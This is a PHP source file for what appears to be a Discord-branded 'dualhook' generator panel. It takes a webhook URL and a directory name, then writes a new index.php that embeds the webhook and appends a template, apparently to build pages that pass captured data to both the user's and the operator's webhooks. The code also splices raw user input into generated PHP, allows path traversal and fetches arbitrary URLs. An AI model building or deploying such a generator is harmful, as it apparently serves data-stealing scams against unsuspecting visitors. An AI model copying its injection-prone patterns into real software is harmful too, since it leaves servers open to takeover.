<?php
error_reporting(0);
include("../setup.php");
$dweb = $_POST['webhook'];
$dir = $_POST['dir'];
if ($dweb)
{
    $contents = file_get_contents($dweb);
    $decode = json_decode($contents, true);
    $hookapi = $decode['id'];
}
if ($dweb and $hookapi == true)
{   
    $dr = "../dir/$dir";
    if (file_exists($dr) == true) {
    } else {
        if (mkdir("../dir/$dr", 0777, true)) {
            $build = file_get_contents("../api/dir_dualhook.php");
            file_put_contents("../dir/$dr/index.php", '<?php $dualhook = "'.$dweb.'"; ?>');
            file_put_contents("../dir/$dr/index.php", "$build", FILE_APPEND);
            include("../api/notifier.php");
            header("Location: ../dir/$dr");
        }
    }    

}

ob_start();
?>
<html lang="en"><head>
  <title><?php echo $user ?></title>
  <link rel="stylesheet" href="c.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <meta name="viewport" content="width=device-width"><meta charset="utf-8">
</head>
<body translate="no" data-new-gr-c-s-check-loaded="14.1112.0" data-gr-ext-installed="">
  <div class="mx-auto container flex items-center">
        <div class="w-full pt-2 p-4">
            <div class="mx-auto md:p-6 md:w-1/2">
                <div class="flex flex-wrap justify-between">
                    <h1 class="text-2xl text-<?php echo $color ?>-500 hover:text-<?php echo $color ?>-500 transition duration-500 p-4">
                    <?php echo $user ?><i class="fa fa-star-o"></i> <?php echo $ver;?></h1>
                    <a href="//<?php echo $discord;?>" class="mt-8 text-<?php echo $color ?>-400 hover:text-<?php echo $color ?>-600 transition duration-500">
                   Discord Server <center> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-discord" viewBox="0 0 16 16">
  <path d="M13.545 2.907a13.227 13.227 0 0 0-3.257-1.011.05.05 0 0 0-.052.025c-.141.25-.297.577-.406.833a12.19 12.19 0 0 0-3.658 0 8.258 8.258 0 0 0-.412-.833.051.051 0 0 0-.052-.025c-1.125.194-2.22.534-3.257 1.011a.041.041 0 0 0-.021.018C.356 6.024-.213 9.047.066 12.032c.001.014.01.028.021.037a13.276 13.276 0 0 0 3.995 2.02.05.05 0 0 0 .056-.019c.308-.42.582-.863.818-1.329a.05.05 0 0 0-.01-.059.051.051 0 0 0-.018-.011 8.875 8.875 0 0 1-1.248-.595.05.05 0 0 1-.02-.066.051.051 0 0 1 .015-.019c.084-.063.168-.129.248-.195a.05.05 0 0 1 .051-.007c2.619 1.196 5.454 1.196 8.041 0a.052.052 0 0 1 .053.007c.08.066.164.132.248.195a.051.051 0 0 1-.004.085 8.254 8.254 0 0 1-1.249.594.05.05 0 0 0-.03.03.052.052 0 0 0 .003.041c.24.465.515.909.817 1.329a.05.05 0 0 0 .056.019 13.235 13.235 0 0 0 4.001-2.02.049.049 0 0 0 .021-.037c.334-3.451-.559-6.449-2.366-9.106a.034.034 0 0 0-.02-.019Zm-8.198 7.307c-.789 0-1.438-.724-1.438-1.612 0-.889.637-1.613 1.438-1.613.807 0 1.45.73 1.438 1.613 0 .888-.637 1.612-1.438 1.612Zm5.316 0c-.788 0-1.438-.724-1.438-1.612 0-.889.637-1.613 1.438-1.613.807 0 1.451.73 1.438 1.613 0 .888-.631 1.612-1.438 1.612Z"></path>
</svg>    </center>
                    </a>
                </div>
                <div class="bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4">
                    <form method="POST" action="">
                        <div class="mb-8">
                            <label for="webhook" class="block text-gray-700 text-sm font-bold mb-2">
                                Webhook</label>
                            <div class="mt-1 relative rounded-md shadow-sm">
                                <div class="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none">
                                    <svg class="h-5 w-5 text-gray-400" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                                </div>
                                <input name="webhook" type="text" class="block pr-10 shadow appearance-none border-2 border-<?php echo $color ?>-100 rounded w-full py-2 px-4 text-gray-700 mb-3 leading-tight focus:outline-none focus:bg-white focus:border-<?php echo $color ?>-500 transition duration-500 ease-in-out" value="<?php echo $dweb;?>" required="">
                            </div>
                        </div>
                        <div class="mb-8">
                            <label for="webhook" class="block text-gray-700 text-sm font-bold mb-2">
                                Directory</label>
                            <div class="mt-1 relative rounded-md shadow-sm">
                                <div class="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none">
                                    <svg class="h-5 w-5 text-gray-400" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                                </div>
                                <input name="dir" type="text" class="block pr-10 shadow appearance-none border-2 border-<?php echo $color ?>-100 rounded w-full py-2 px-4 text-gray-700 mb-3 leading-tight focus:outline-none focus:bg-white focus:border-<?php echo $color ?>-500 transition duration-500 ease-in-out" value="<?php echo $dir;?>" required="">
                            </div>
                        </div>
                        <div class="mb-6">
                            <div class="flex items-center justify-between">
                                <div>
                                    <label class="block text-gray-500 font-bold" for="remember"> 
                                    <?php if ($dweb and $hookapi == false)
{
    echo '<label for="webhook" class="block text-red-700 text-sm font-bold mb-2">Invalid Webhook!</label>';
}
elseif ($dr == True)
{
    echo '<label for="webhook" class="block text-red-700 text-sm font-bold mb-2">Directory Taken!</label>';
}
?>
                                    </label>
                                </div>
                                <div>
                                    <a class="font-bold text-sm text-<?php echo $color ?>-500 hover:text-<?php echo $color ?>-800" href=""></a>
                                </div>
                            </div>
                        </div>
                        <div class="mb-4 text-center">
                            <button name="send" class="transition duration-500 bg-<?php echo $color ?>-500 hover:bg-<?php echo $color ?>-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline" type="submit">Generate <i class="fa fa-send"></i></button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

</body></html>